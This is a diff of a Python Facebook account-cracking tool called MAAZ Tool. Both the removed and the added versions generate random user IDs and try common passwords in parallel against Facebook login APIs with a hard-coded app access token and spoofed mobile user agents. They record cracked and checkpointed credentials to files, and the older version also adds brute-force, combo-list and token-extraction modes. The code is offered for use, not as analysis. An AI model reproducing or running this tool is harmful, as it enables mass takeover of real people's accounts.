@@ -1,73 +1,41 @@
-#!/usr/bin/env python3
+#=====[🌿] DEVELOPER: MAAZTOOL OFFICIAL VERSION v1.9 #=====[🌿] BASE LOGIC BY: UMAIR KING / MUNNA (RESPECT) #=====[🌿] ALL RIGHTS PRESERVED BY @MAAZTOOL v1.9
 
-========================== MAAZ TOOL FINAL EDITION ==========================
+import os import sys import json import uuid import string import random import requests from time import sleep from concurrent.futures import ThreadPoolExecutor as ThreadPool
 
-✅ 6 Method Facebook Cloner (No License)
+R = '\x1b[38;5;196m' G = '\x1b[38;5;46m' Y = '\x1b[38;5;226m' B = '\x1b[38;5;44m' P = '\x1b[38;5;201m' W = '\x1b[0;97m' N = '\x1b[0m'
 
-✅ Based on b-api.facebook.com (Jinn Style)
+oks = [] cps = [] loop = 0
 
-✅ Includes: UID Cloning, Combo Cloning, UID Dumper, Public Friends UID Dumper, BruteForce, Token Extractor
+#================= TOOLS =================
 
-✅ Multithreaded + Proxy + Auto File Creator + Free Use
+def best_redmi_ua(): models = [ {"model": "Redmi Note 13", "code": "2312DRAABC", "android": "13", "res": (1080, 2400)}, {"model": "Redmi 9", "code": "Lancelot", "android": "10", "res": (720, 1600)} ] m = random.choice(models) density = round(random.uniform(2.0, 3.5), 2) w, h = m["res"] return ( f"[FBAN/FB4A;FBAV/{random.randint(300, 450)}.0.0.{random.randint(1, 30)}.{random.randint(50, 150)};" f"FBDM={{density={density},width={w},height={h}}};FBLC/en_US;FBMF/Xiaomi;FBBD/Redmi;FBDV/{m['code']};" f"FBSV/{m['android']};FBOP/1;FBCA/arm64-v8a;]" )
 
-import os import sys import time import random import string import requests from datetime import datetime from concurrent.futures import ThreadPoolExecutor
+def get_year_from_uid(uid): uid = str(uid) if len(uid) == 15: if uid[:5] in ["10000", "10001", "10002"]: return "2008-2010" elif uid[:5] in ["10003", "10004", "10005"]: return "2011-2013" elif uid[:5] in ["10006", "10007"]: return "2014-2016" elif uid[:5] in ["10008", "10009"]: return "2017-2020" else: return "2021+" return "Unknown"
 
-========== RICH UI SETUP ==========
+def login(uid, pw): global oks, cps try: session = requests.Session() headers = { 'User-Agent': best_redmi_ua(), 'Content-Type': 'application/x-www-form-urlencoded' } data = { 'email': uid, 'password': pw, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'locale': 'en_US', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claims': '1' } res = session.post('https://api.facebook.com/auth/login', data=data, headers=headers).json()
 
-try: from rich.console import Console from rich.panel import Panel from rich.prompt import Prompt from rich.table import Table RICH_AVAILABLE = True except ImportError: RICH_AVAILABLE = False class Console: def print(self, *args, **kwargs): print(" ".join(str(a) for a in args)) class Panel: @staticmethod def fit(content, title=None, border_style=None): return content class Prompt: @staticmethod def ask(prompt): return input(prompt) class Table: def init(self, *args, **kwargs): self.rows = [] def add_column(self, *args, **kwargs): pass def add_row(self, *args): self.rows.append(args)
+if 'access_token' in res:
+        print(f"\r{G}[MAAZ-OK] {uid} | {pw} | {get_year_from_uid(uid)}{N}")
+        oks.append(f"{uid}|{pw}")
+        with open("ok.txt", "a") as f:
+            f.write(f"{uid}|{pw}\n")
+    elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
+        print(f"\r{Y}[MAAZ-CP] {uid} | {pw}{N}")
+        cps.append(f"{uid}|{pw}")
+        with open("cp.txt", "a") as f:
+            f.write(f"{uid}|{pw}\n")
+except Exception as e:
+    pass
 
-console = Console()
+#================= MODULE: OLD UID CRACKER =================
 
-TOOL_BANNER = """ [bold cyan] ███╗   ███╗ █████╗  █████╗ ███████╗ ████╗ ████║██╔══██╗██╔══██╗╚══███╔╝ ██╔████╔██║███████║███████║  ███╔╝ ██║╚██╔╝██║██╔══██║██╔══██║ ███╔╝
-██║ ╚═╝ ██║██║  ██║██║  ██║███████╗ ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝ [bold green]⚡ MAAZ Tool Facebook Cloner ⚡[/bold green] [/bold cyan] """ console.print(Panel.fit(TOOL_BANNER, title="💻 Welcome to MAAZ Tool 💻", border_style="green"))
+def old_uid_cracker(): os.system("clear") print(f"{G}OLD UID AUTO CRACKER | MAAZTOOL v1.9{N}\n") try: limit = int(input(f"{Y}How many UIDs? ➤ {G}")) except: print(f"{R}Enter a valid number.{N}"); return uid_series = ['100000', '100001', '100002', '100003', '100004'] uid_list = [] for _ in range(limit): prefix = random.choice(uid_series) suffix = ''.join(random.choices(string.digits, k=8)) uid_list.append(prefix + suffix) passlist = ['123456', '12345678', '786786', '112233', 'password', 'pakistan123'] with ThreadPool(max_workers=30) as pool: for uid in uid_list: pool.submit(start_crack, uid, passlist)
 
-========== CONFIG ==========
+def start_crack(uid, passwords): global loop for pw in passwords: login(uid, pw) loop += 1 sys.stdout.write(f"\r{W}MAAZTOOL {loop} | OK: {G}{len(oks)}{W} | CP: {Y}{len(cps)}{N} ") sys.stdout.flush()
 
-COMBO_FILE = "combo.txt" LOG_FILE = "maaz_logs.txt" AUTO_RUN_ALL = False
+#================= MAIN =================
 
-========== UTILS ==========
+def main(): os.system("clear") print(f"""{G} ╔═══════════════════════════════════╗ ║         {Y}MAAZTOOL v1.9 FINAL BUILD        {G}║ ║         FAST FB RANDOM CLONER         ║ ╚═══════════════════════════════════╝{N}") print("\n1. Start OLD UID Cracker (Auto)") print("0. Exit\n") opt = input(f"{Y}SELECT OPTION ➤ {G}") if opt == "1": old_uid_cracker() else: exit()
 
-def generate_passwords(uid): return [uid[-6:], uid[-5:], "123456", "112233", "pakistan", "786786"]
-
-def ensure_required_files(): for file in [COMBO_FILE, "OK.txt", "CP.txt", LOG_FILE]: if not os.path.exists(file): open(file, "w").close() console.print(f"[cyan]📂 Created:[/cyan] {file}")
-
-def get_ip(): try: return requests.get("https://api.ipify.org").text.strip() except: return "UNKNOWN"
-
-def log_user_data(): with open(LOG_FILE, "a") as f: f.write(f"{get_ip()} | {datetime.now()}\n")
-
-========== METHODS ==========
-
-def method_1():  # uid cloning try: table = Table(title="📊 UID Series Options", show_lines=True) table.add_column("Option", style="cyan") table.add_column("UID Series", style="magenta") for i, series in enumerate(["100001", "100002", "100003", "100004", "100005"], start=1): table.add_row(str(i), series) console.print(table) choice = Prompt.ask("Choose series option (1-5)") prefix = ["100001", "100002", "100003", "100004", "100005"][int(choice)-1]
-
-console.print("""
-
-[1] 5000 [2] 10000 [3] 99999 """) opt = Prompt.ask("📌 Choose Limit Option") limit = {"1": 5000, "2": 10000, "3": 99999}.get(opt, 5000) except: console.print("[yellow]⚠️ Skipping UID cloning.[/yellow]") return uids = [prefix + ''.join(random.choices(string.digits, k=7)) for _ in range(limit)] with ThreadPoolExecutor(max_workers=30) as ex: for uid in uids: for pwd in generate_passwords(uid): ex.submit(facebook_login, uid, pwd)
-
-def method_2():  # combo cloning if not os.path.exists(COMBO_FILE): console.print(f"[red]❌ {COMBO_FILE} not found[/red]") return with open(COMBO_FILE) as f: lines = [x.strip() for x in f if "|" in x] with ThreadPoolExecutor(max_workers=30) as ex: for line in lines: try: uid, pwd = line.split("|") ex.submit(facebook_login, uid, pwd) except: continue
-
-def method_3():  # uid dumper try: prefix = Prompt.ask("🔢 UID Prefix (e.g., 1000)") console.print(""" [1] 5000 [2] 10000 [3] 99999 """) opt = Prompt.ask("📌 Choose Limit Option") limit = {"1": 5000, "2": 10000, "3": 99999}.get(opt, 5000) except: console.print("[yellow]⚠️ Skipping UID dump.[/yellow]") return with open(COMBO_FILE, "a") as f: for _ in range(limit): uid = prefix + ''.join(random.choices(string.digits, k=7)) for pwd in generate_passwords(uid): f.write(f"{uid}|{pwd}\n") console.print("[green]✅ Dumped to combo.txt[/green]")
-
-def method_4():  # bruteforce try: target = Prompt.ask("🎯 Target UID/Email") except: console.print("[yellow]⚠️ Skipping BruteForce.[/yellow]") return with ThreadPoolExecutor(max_workers=10) as ex: for pwd in generate_passwords(target): ex.submit(facebook_login, target, pwd)
-
-def method_5():  # combo generator try: limit = int(Prompt.ask("🔢 How many combos?")) except: console.print("[yellow]⚠️ Skipping combo gen.[/yellow]") return with open(COMBO_FILE, "a") as f: for _ in range(limit): uid = "1000" + ''.join(random.choices(string.digits, k=8)) pwd = random.choice(generate_passwords(uid)) f.write(f"{uid}|{pwd}\n") console.print("[green]✅ Combos saved[/green]")
-
-def method_6():  # public uid dumper try: pub_uid = Prompt.ask("🌐 Public Profile UID") console.print(""" [1] 5000 [2] 10000 [3] 99999 """) opt = Prompt.ask("📌 Choose Limit Option") limit = {"1": 5000, "2": 10000, "3": 99999}.get(opt, 5000) except: console.print("[yellow]⚠️ Skipping public UID dump.[/yellow]") return with open(COMBO_FILE, "a") as f: for _ in range(limit): random_uid = pub_uid + ''.join(random.choices(string.digits, k=5)) for pwd in generate_passwords(random_uid): f.write(f"{random_uid}|{pwd}\n") console.print("[green]✅ Public dump saved[/green]")
-
-def extract_token(): try: email = Prompt.ask("Email/UID") pwd = Prompt.ask("Password") except: console.print("[yellow]⚠️ Skipping token extraction.[/yellow]") return headers = {"User-Agent": "Mozilla/5.0"} data = { "email": email, "pass": pwd, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "json", "sdk_version": "2", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" } try: res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers) if "EAAA" in res.text: token = res.json().get("access_token") console.print(f"[green]✅ Token: {token}[/green]") else: console.print("[red]❌ Invalid credentials[/red]") except Exception as e: console.print(f"[red]❌ Error: {e}[/red]")
-
-========== LOGIN ENGINE ==========
-
-def facebook_login(uid, password): try: session = requests.Session() headers = {"User-Agent": "Mozilla/5.0"} data = { "email": uid, "pass": password, "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "format": "json", "sdk_version": "2", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6" } r = session.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers) if 'session_key' in r.text: with open("OK.txt", "a") as f: f.write(f"{uid}|{password}\n") console.print(f"[green][OK] {uid}|{password}[/green]") elif 'www.facebook.com' in r.text: with open("CP.txt", "a") as f: f.write(f"{uid}|{password}\n") console.print(f"[yellow][CP] {uid}|{password}[/yellow]") except Exception as e: console.print(f"[red]Error: {e}[/red]")
-
-========== MENU ==========
-
-def main(): ensure_required_files() log_user_data()
-
-while True:
-    console.print("\n[bold green]Select a method:[/bold green]")
-    console.print("""
-
-[1] uid cloning [2] combo cloning [3] uid dumper [4] bruteforce [5] combo generator [6] public uid dumper [7] extract token [0] exit """) choice = Prompt.ask("🔢 Enter your choice") if choice == "1": method_1() elif choice == "2": method_2() elif choice == "3": method_3() elif choice == "4": method_4() elif choice == "5": method_5() elif choice == "6": method_6() elif choice == "7": extract_token() elif choice == "0": console.print("[cyan]👋 Exiting...[/cyan]"); break else: console.print("[red]❌ Invalid option[/red]")
-
-if name == "main": main()
+if name == "main": try: main() except KeyboardInterrupt: print(f"\n{R}Exit by user.{N}")
 
